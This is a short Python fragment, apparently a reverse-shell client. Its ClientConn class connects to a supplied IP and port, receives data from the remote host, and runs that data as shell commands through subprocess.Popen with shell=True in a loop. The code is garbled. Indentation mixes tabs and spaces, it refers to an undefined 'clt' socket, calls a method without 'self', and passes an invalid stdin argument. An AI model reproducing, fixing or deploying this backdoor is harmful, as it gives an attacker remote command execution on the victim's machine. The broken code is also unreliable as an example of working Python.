
class ClientConn(object):
    import subprocess

    def __init__(self, socket, ipc, portc):
      self.socket = socket
      self.ipc = ipc
      self.portc = portc

    def connect_clt(self):
		try:
			clt.connect((self.ipc,self.portc))
			response = clt.recv(4096)
			clt.send('[*] @ Response : {}'.format(response))
            return response
		except Exception as e:
            print(str(e))

	def sucess(self):
        response = connect_clt()
		while True:
			proc = subprocess.Popen(response, shell=True,stdin=subprocess, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			clt.send('[*] @ Connection on')